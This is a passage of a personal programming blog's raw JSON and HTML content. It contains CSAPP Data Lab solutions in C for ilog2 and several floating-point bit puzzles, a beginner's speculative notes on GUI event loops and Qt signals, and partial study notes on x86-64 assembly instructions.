class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: ilog2(16) = 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 90</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">ilog2</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark1 = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark2 = <span class=\"number\">0x33</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark3 = <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tx &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">1</span>&amp;mark1)+(x&amp;mark1);\t<span class=\"comment\">//every two bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">2</span>&amp;mark2)+(x&amp;mark2);\t<span class=\"comment\">//every four bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">4</span>&amp;mark3)+(x&amp;mark3);\t<span class=\"comment\">//every eight bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">8</span>)+x;\t<span class=\"comment\">//every 16 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">16</span>)+x;\t<span class=\"comment\">//every 32 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-10\"><a href=\"#思路-10\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>先构造从最高的1到最低位均为1的二进制，然后类似bitCount</li>\n</ul>\n<h3 id=\"float-neg\"><a href=\"#float-neg\" class=\"headerlink\" title=\"float_neg\"></a>float_neg</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class=\"line\"><span class=\"comment\"> *   floating point argument f.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   When argument is NaN, return argument.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 10</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_neg</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> uf)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = uf&amp;<span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(t^<span class=\"number\">0x7F800000</span> &amp;&amp; (t&gt;&gt;<span class=\"number\">23</span>)+<span class=\"number\">1</span>&gt;&gt;<span class=\"number\">8</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> </span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf^<span class=\"number\">0x80000000</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-11\"><a href=\"#思路-11\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>判别是否是NaN。先判断尾数是否全0，然后用<code>(t&gt;&gt;23)+1&gt;&gt;8</code>判断exp是否全1</li>\n</ul>\n<h3 id=\"float-i2f\"><a href=\"#float-i2f\" class=\"headerlink\" title=\"float_i2f\"></a>float_i2f</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class=\"line\"><span class=\"comment\"> *   Result is returned as unsigned int, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 30</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_i2f</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> shiftLeft=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> afterShift, tmp, flag;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> absX=x;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> sign=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//special case</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x==<span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//if x &lt; 0, sign = 1000...,abs_x = -x</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sign=<span class=\"number\">0x80000000</span>;</span><br><span class=\"line\">        absX=-x;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    afterShift=absX;</span><br><span class=\"line\">    <span class=\"comment\">//count shift_left and after_shift</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tmp=afterShift;</span><br><span class=\"line\">        afterShift&lt;&lt;=<span class=\"number\">1</span>;</span><br><span class=\"line\">        shiftLeft++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tmp &amp; <span class=\"number\">0x80000000</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((afterShift &amp; <span class=\"number\">0x01ff</span>)&gt;<span class=\"number\">0x0100</span>)</span><br><span class=\"line\">        flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((afterShift &amp; <span class=\"number\">0x03ff</span>)==<span class=\"number\">0x0300</span>)</span><br><span class=\"line\">        flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> sign + (afterShift&gt;&gt;<span class=\"number\">9</span>) + ((<span class=\"number\">159</span>-shiftLeft)&lt;&lt;<span class=\"number\">23</span>) + flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//from http://www.cnblogs.com/tenlee/p/4951639.html</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-12\"><a href=\"#思路-12\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>分情况处理0、负数、正数</p>\n</li>\n<li><p>要处理舍人</p>\n<blockquote>\n<ul>\n<li>向接近的舍入</li>\n<li>如果处于中间，向偶数舍入</li>\n</ul>\n</blockquote>\n</li>\n<li><p>舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的</p>\n</li>\n</ul>\n<h3 id=\"float-twict\"><a href=\"#float-twict\" class=\"headerlink\" title=\"float_twict\"></a>float_twict</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class=\"line\"><span class=\"comment\"> *   floating point argument f.</span></span><br><span class=\"line\"><span class=\"comment\"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class=\"line\"><span class=\"comment\"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class=\"line\"><span class=\"comment\"> *   single-precision floating point values.</span></span><br><span class=\"line\"><span class=\"comment\"> *   When argument is NaN, return argument</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 30</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">float_twice</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> uf)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> t = uf&amp;<span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> temp = t&amp;<span class=\"number\">0x7F800000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> temp2 = uf&amp;<span class=\"number\">0xFF800000</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> expFull = !(temp^<span class=\"number\">0x7F800000</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(t^<span class=\"number\">0x7F800000</span> &amp;&amp; expFull)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> uf;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(expFull)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> temp2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!(t&amp;<span class=\"number\">0x7F800000</span>))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">unsigned</span> k = (uf&amp;<span class=\"number\">0x7FFFFF</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> temp2+(k&lt;&lt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (temp&gt;&gt;<span class=\"number\">23</span>)+<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">23</span> | uf&amp;<span class=\"number\">0x807FFFFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-13\"><a href=\"#思路-13\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>分情况处理三种IEEE754的情况</li>\n<li>需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了</li>\n</ul>\n","slug":"CSAPP-Data-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"初学GUI的一些理解（瞎猜）","date":"2017-08-11T10:15:36.000Z","path":"2017/08/11/初学GUI的一些理解（瞎猜）/","text":"应该把整个程序运行过程分解为： 描述一个界面(前端) show出来 进入无限循环 在循环里按照刷新频率show这个界面 每次循环里还检测是否有输入，如果没有，就继续下一次循环 如果有，就像控制台程序一样，接受输入，给出输出 当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源) 也就是说，我把一个窗口程序分解为 定义图形 重复画图 对输入给出输出的类似控制台程序 在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端 进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数) 以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。 接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数) 如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来 但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数 如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数) 所谓发射出去，我猜测如下 GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次) 组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环) 把该消息放在共享的那块内存，然后每个组件都执行一次消息循环","raw":"---\ntitle: 初学GUI的一些理解（瞎猜）\ntoc:\ncomments: true\nmathjax: true\ndate: 2017-08-11 18:15:36\ntags:\n- GUI\n- Qt\ndescription:\ncategories:\n- 开发\n---\n- 应该把整个程序运行过程分解为：\n\n  1. 描述一个界面(前端)\n\n  - show出来\n  - 进入无限循环\n  - 在循环里按照刷新频率show这个界面\n  - 每次循环里还检测是否有输入，如果没有，就继续下一次循环\n  - 如果有，就像控制台程序一样，接受输入，给出输出\n  - 当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)\n\n- 也就是说，我把一个窗口程序分解为\n\n  1. 定义图形\n  2. 重复画图\n  3. 对输入给出输出的类似控制台程序\n\n\n- 在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端\n- 进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)\n- 以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。\n- 接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)\n- 如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来\n- 但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数\n- 如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)\n- 所谓发射出去，我猜测如下\n  1. GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)\n  2. 组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)\n  3. 把该消息放在共享的那块内存，然后每个组件都执行一次消息循环\n","content":"<ul>\n<li><p>应该把整个程序运行过程分解为：</p>\n<ol>\n<li>描述一个界面(前端)</li>\n</ol>\n<ul>\n<li>show出来</li>\n<li>进入无限循环</li>\n<li>在循环里按照刷新频率show这个界面</li>\n<li>每次循环里还检测是否有输入，如果没有，就继续下一次循环</li>\n<li>如果有，就像控制台程序一样，接受输入，给出输出</li>\n<li>当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)</li>\n</ul>\n</li>\n<li><p>也就是说，我把一个窗口程序分解为</p>\n<ol>\n<li>定义图形</li>\n<li>重复画图</li>\n<li>对输入给出输出的类似控制台程序</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端</li>\n<li>进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)</li>\n<li>以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。</li>\n<li>接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)</li>\n<li>如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来</li>\n<li>但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数</li>\n<li>如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)</li>\n<li>所谓发射出去，我猜测如下<ol>\n<li>GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)</li>\n<li>组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)</li>\n<li>把该消息放在共享的那块内存，然后每个组件都执行一次消息循环</li>\n</ol>\n</li>\n</ul>\n","slug":"初学GUI的一些理解（瞎猜）","categories":[{"name":"开发","slug":"开发","permalink":"https://h-zex.github.io/categories/开发/"}],"tags":[{"name":"GUI","slug":"GUI","permalink":"https://h-zex.github.io/tags/GUI/"},{"name":"Qt","slug":"Qt","permalink":"https://h-zex.github.io/tags/Qt/"}]},{"title":"汇编相关","date":"2017-08-06T14:35:44.000Z","path":"2017/08/06/汇编相关/","text":"MOV 操作数不能都是memory register must match the suffix movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展 movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register movz、movs系列have a register or memory location as the source and a register as the destination. cltq: SignExtend(%eax) -&gt; %rax movzlq不存在，可以用movl实现。但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在 其他指令 leaq: has no other size variants The destination operand must be a register. Unary Operations: operand can be either a register or a memory location. Binary Operations: the second operand is used as both a source and a destination the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location. the two operands can’t both be memory location when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory. Shift Operations shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift shift amount can be imm value or %cl a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63 destination can be register or memory location 浮点指令 vmovss, vmovd的操作数可以是（第一个source，第二个destination） memory， XMM XMM， memory 按照书上的描述，好像还可以XMM， XMM vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。 vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM） vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已） vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss） vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq） vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样 MISC intel format have reverse order operands; Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value Such a reference has four components: an immediate offset Imm, a base register rb, an index register ri, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers. Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0 后缀的匹配","raw":"---\ntitle: 汇编相关\ntags:\n- 汇编\ntoc: flase\ncomments: true\nmathjax: true\ncategories:\n- CSAPP\ndate: 2017-08-06 22:35:44\ndescription: CSAPP提到的汇编相关知识点\n---\n#### MOV\n\n- 操作数不能都是memory\n- register must match the suffix\n- movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展\n- movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register\n- movz、movs系列have a register or memory location as the source and a register as the destination.\n- cltq: SignExtend(%eax) -> %rax\n- movzlq不存在，可以用movl实现。**但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在**\n\n#### 其他指令\n\n- leaq:\n  -  has no other size variants\n  -  The destination operand must be a register.\n- Unary Operations:\n  -  operand can be either a register or a memory location. \n- Binary Operations:\n  - the second operand is used as both a source and a destination\n  - the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.\n  - the two operands can't both be memory location\n  - when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.\n- Shift Operations\n  - shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift\n  - shift amount can be imm value or %cl\n  - a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63\n  - destination can be register or memory location\n\n## 浮点指令\n\n- vmovss, vmovd的操作数可以是（第一个source，第二个destination）\n  - memory， XMM\n  - XMM， memory\n  - 按照书上的描述，好像还可以XMM， XMM\n- vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。\n- vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）\n- vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）\n- vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）\n- vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）\n- vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM\n- vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样\n\n#### MISC\n\n- intel format have reverse order operands;\n- Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value \n- Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.\n- Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0\n- 后缀的匹配\n","content":"<h4 id=\"MOV\"><a href=\"#MOV\" class=\"headerlink\" title=\"MOV\"></a>MOV</h4><ul>\n<li>操作数不能都是memory</li>\n<li>register must match the suffix</li>\n<li>movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展</li>\n<li>movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register</li>\n<li>movz、movs系列have a register or memory location as the source and a register as the destination.</li>\n<li>cltq: SignExtend(%eax) -&gt; %rax</li>\n<li>movzlq不存在，可以用movl实现。<strong>但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在</strong></li>\n</ul>\n<h4 id=\"其他指令\"><a href=\"#其他指令\" class=\"headerlink\" title=\"其他指令\"></a>其他指令</h4><ul>\n<li>leaq:<ul>\n<li>has no other size variants</li>\n<li>The destination operand must be a register.</li>\n</ul>\n</li>\n<li>Unary Operations:<ul>\n<li>operand can be either a register or a memory location. </li>\n</ul>\n</li>\n<li>Binary Operations:<ul>\n<li>the second operand is used as both a source and a destination</li>\n<li>the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.</li>\n<li>the two operands can’t both be memory location</li>\n<li>when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.</li>\n</ul>\n</li>\n<li>Shift Operations<ul>\n<li>shift amount is given first and the value to shift is given 